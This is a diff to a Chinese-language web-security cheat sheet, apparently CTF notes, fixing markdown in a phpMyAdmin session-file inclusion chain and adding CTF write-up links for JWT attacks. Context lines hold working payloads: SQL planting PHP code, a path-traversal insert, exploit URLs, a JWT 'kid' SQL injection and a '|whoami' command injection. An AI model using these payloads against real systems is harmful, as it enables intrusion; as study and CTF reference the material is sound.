@@ -1319,7 +1319,7 @@ pop graphic-context
             - 能登入後台
         - step1. `CREATE DATABASE foo;CREATE TABLE foo.bar (baz VARCHAR(100) PRIMARY KEY );INSERT INTO foo.bar SELECT '<?php phpinfo(); ?>';`
         - step2. `/chk_rel.php?fixall_pmadb=1&db=foo`
-        - step3. `INSERT INTO` pma__column_infoSELECT '1', 'foo', 'bar', 'baz', 'plop','plop', ' plop', 'plop','../../../../../../../../tmp/sess_{SESSIONID}','plop';`
+        - step3. ```INSERT INTO` pma__column_infoSELECT '1', 'foo', 'bar', 'baz', 'plop','plop', ' plop', 'plop','../../../../../../../../tmp/sess_{SESSIONID}','plop';```
         - step4. `/tbl_replace.php?db=foo&table=bar&where_clause=1=1&fields_name[multi_edit][][]=baz&clause_is_unique=1`
     - CVE-2018-12613
         - phpMyAdmin versions: 4.8.x
@@ -3607,6 +3607,8 @@ state[i] = state[i-3] + state[i-31]`
     - 暴力破解密鑰
         - Tool: [JWT Cracker](https://github.com/brendan-rius/c-jwt-cracker)
             - usage: `./jwtcrack eyJhbGci....`
+        - Example:
+            - [WCTF 2020 - thymeleaf](https://github.com/w181496/CTF/tree/master/wctf2020/thymeleaf)
     - kid 參數 (key ID)
         - 是一個可選參數
         - 用於指定加密算法的密鑰
@@ -3617,9 +3619,12 @@ state[i] = state[i-3] + state[i-31]`
             - `"kid" : "key11111111' || union select 'secretkey' -- "`
         - Command Injection
             - Ruby open: `"/path/to/key_file|whoami"`
+        - Example: [HITB CTF 2017 - Pasty](https://chybeta.github.io/2017/08/29/HITB-CTF-2017-Pasty-writeup/)
     - 敏感訊息洩漏
         - JWT 是保證完整性而不是保證機密性
         - base64 decode 後即可得到 payload 內容
+        - Example
+            - [CSAW CTF 2018 Qual - SSO](https://github.com/w181496/CTF/blob/47fe34112401d123b2b53ee12058e7ec72888e0e/csaw_2018_qual/sso/README.md)
 
 - 常見Port服務
     - http://packetlife.net/media/library/23/common_ports.pdf
